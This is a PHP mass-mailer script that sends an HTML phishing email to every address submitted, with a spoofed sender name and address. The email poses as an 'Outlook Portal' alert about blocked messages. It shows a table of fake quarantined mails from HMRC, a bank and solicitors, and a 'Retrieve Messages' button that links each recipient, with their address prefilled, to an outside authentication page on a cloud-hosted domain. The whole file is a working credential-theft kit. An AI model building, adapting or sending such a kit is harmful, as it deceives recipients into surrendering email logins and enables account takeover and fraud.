<?php

//Pass the details to send.php
$to = $_POST['emails'];
$subject = $_POST['subject'];
$senderName = $_POST['name'];
$senderEmail = $_POST['from'];
$reply = $_POST['reply'];
$bounce = $_POST['bounce'];
$messa = $_POST['message'];
//sanitize and validate the details
function emailsValidator($to){

    $too = [];
    $validtoo = [];  
    $too = preg_split("/[\s,]+/", $to);
    $regex = '/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/';
    
    $fl_array = preg_grep($regex, $too);
    $result = array_merge($validtoo,$fl_array);
    return $result;
}
emailsValidator($to);

//sanitize and validate sender's email
function senderEmailvalidator($senderEmail){
    $regex = '/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/';
    if(!preg_match($regex, $senderEmail)){
        echo "Enter valid Sender's email";
    }
}
senderEmailvalidator($senderEmail);


// Always set content-type when sending HTML email
foreach(emailsValidator($to) as $value){ 
   $dom = substr($value, strpos($value, '@') + 1);
   $user = strstr($value, '@', true); // As of PHP 5.3.0
   $date = date('Y-m-d');
   $time = date('H:i:s');
   

   $headers = "MIME-Version: 1.0" . "\r\n";
   $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n". 'Reply-To: '.$reply . "\r\n";
   $headers .= "From: ".$senderName."<".$senderEmail.">" . "\r\n";
   $additional_parameters = "-f ".$bounce;

   $message = "<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN' 'http://www.w3.org/TR/html4/loose.dtd'>

<HTML><HEAD>
<META name=GENERATOR content='MSHTML 11.00.9600.19940'></HEAD>
<BODY style='MARGIN: 0.5em'>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center><FONT style='FONT-FAMILY: Arial' color=#f25022 size=7>Outlook Portal<BR></FONT><SPAN style='FONT-FAMILY: Arial'><BR>Hi&nbsp;$value,<BR></DIV>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center><BR>We've blocked&nbsp;7 incoming messages due to&nbsp;server re-authentication.</DIV>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center>Kindly retrieve messages from Outlook Portal&nbsp; </DIV>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center><BR><FONT color=#808080>Support ID: EH</FONT>
<SPAN style='FONT-SIZE: 14px; FONT-FAMILY: 'Segoe UI', Helvetica, Arial, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 600; COLOR: rgb(50,49,48); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: 
initial; text-decoration-thickness: initial'><FONT color=#808080> 256475</FONT><BR>
<A class=x_bd style='BORDER-LEFT-WIDTH: 0px; TEXT-DECORATION: none; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; FONT-VARIANT: normal; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: normal; PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit' 
href='https://outlook-appreciative-quoll-oo.eu-gb.mybluemix.net/authe.php?email=$value&amp;TK=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&amp;ref=5465&amp;ivoUpdated' rel='noopener noreferrer' target=_blank data-auth='NotApplicable' data-linkindex='0'></SPAN></DIV>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center><BR>
<DIV class=x_bt style='BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 16px; FONT-FAMILY: Arial; BORDER-RIGHT-WIDTH: 0px; WIDTH: 290px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: bolder; COLOR: rgb(248,248,248); PADDING-BOTTOM: 10px; TEXT-ALIGN: center; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px auto; PADDING-RIGHT: 10px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(242,80,34); font-stretch: inherit'>Retrieve Messages</DIV></DIV></A></SPAN>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center><BR></DIV>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center>
<TABLE style='HEIGHT: 273px; WIDTH: 941px' cellSpacing=0 width=941 border=3>
<TBODY>
<TR style='FONT-FAMILY: Arial'>
<TD><SPAN style='FONT-FAMILY: Arial'><STRONG>S/N</STRONG></SPAN></TD>
<TD><STRONG>From</STRONG></TD>
<TD><STRONG>Subject</STRONG></TD>
<TD><STRONG>Date</STRONG></TD>
<TD><STRONG>Transmission Sc</STRONG></TD></TR>
<TR>
<TD><FONT size=2>1</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>in**@hmrc.gov.uk</FONT></SPAN></TD>
<TD><FONT size=1>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'>HMRC Ref:</SPAN>
&nbsp;<SPAN style='BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); 
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; -webkit-font-smoothing: antialiased'>&nbsp;</SPAN>&nbsp;<FONT color=#1b1b1b face='Segoe UI'>$dom</FONT>
&nbsp;<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'>&nbsp;MA:132052.0001</SPAN></FONT></TD>
<TD><FONT size=2>09/06/2021</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>[ME1S01FT020.eop-S01.prod.protection.outlook.com]</FONT></SPAN></TD></TR>
<TR>
<TD><FONT size=1>2</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>**6@hotmail.com</FONT></SPAN></TD>
<TD><FONT size=1>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'>Claim 1 Ref</SPAN>
&nbsp;<SPAN style='BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); 
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; -webkit-font-smoothing: antialiased'>&nbsp;</SPAN>
&nbsp;<SPAN style='BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(27,27,27); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; 
BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; -webkit-font-smoothing: antialiased'>$dom&nbsp;</SPAN>
 <SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'>:MA:002936.0004</SPAN></FONT></TD>
<TD><FONT size=2>09/06/2021</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>[ME1S01FT020.eop-S01.prod.protection.outlook.com]</FONT></SPAN></TD></TR>
<TR>
<TD><FONT size=2>3</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>**it5@gmail.com</FONT></SPAN></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>Fee for GP records</FONT></SPAN></TD>
<TD><FONT size=2>09/06/2021</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>[ME1S01FT020.eop-S01.prod.protection.outlook.com]</FONT></SPAN></TD></TR>
<TR>
<TD><FONT size=2>4</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>**fo@santanderbank.com</FONT></SPAN></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>Get the latest on our response to COVID-19. We&#8217;re here for you.</FONT></SPAN></TD>
<TD><FONT size=2>09/06/2021</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>[ME1S01FT020.eop-S01.prod.protection.outlook.com]</FONT></SPAN></TD></TR>
<TR>
<TD><FONT size=2>5</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>info@***solicitorllp.com</FONT></SPAN></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>Requisition on title and Local search Ref: ED32450</FONT></SPAN></TD>
<TD><FONT size=2>09/06/2021</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>[ME1S01FT020.eop-S01.prod.protection.outlook.com]</FONT></SPAN></TD></TR>
<TR>
<TD><FONT size=2>6</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>no-reply@helpdesk.com</FONT></SPAN></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>Scanned: Completion Statement-pdf&nbsp;</FONT></SPAN></TD>
<TD><FONT size=2>09/06/2021</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>[ME1S01FT020.eop-S01.prod.protection.outlook.com]</FONT></SPAN></TD></TR>
<TR>
<TD><FONT size=1>7</FONT></TD>
<TD><FONT size=1>
<SPAN style='BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 8pt; FONT-FAMILY: 'Segoe UI'; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); 
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; -webkit-font-smoothing: antialiased'><A href='mailto:i***@$dom'>i***@</SPAN>
<SPAN style='BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 8pt; FONT-FAMILY: 'Segoe UI'; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); 
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; text-decoration-thickness: initial; font-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit; -webkit-font-smoothing: antialiased'>
<SPAN style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(27,27,27); PADDING-BOTTOM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: inline !important; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased'>$dom</A></SPAN></SPAN></FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>Scanned: 4345654335-pdf</FONT></SPAN></TD>
<TD><FONT size=2>09/06/2021</FONT></TD>
<TD>
<SPAN style='FONT-SIZE: 10px; FONT-FAMILY: 'Segoe UI'; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; TEXT-ALIGN: center; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial; 
text-decoration-thickness: initial'><FONT size=2>[ME1S01FT020.eop-S01.prod.protection.outlook.com]</FONT></SPAN></TD></TR></TBODY></TABLE></DIV>
<DIV class=x_x1 style='BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px' align=center>
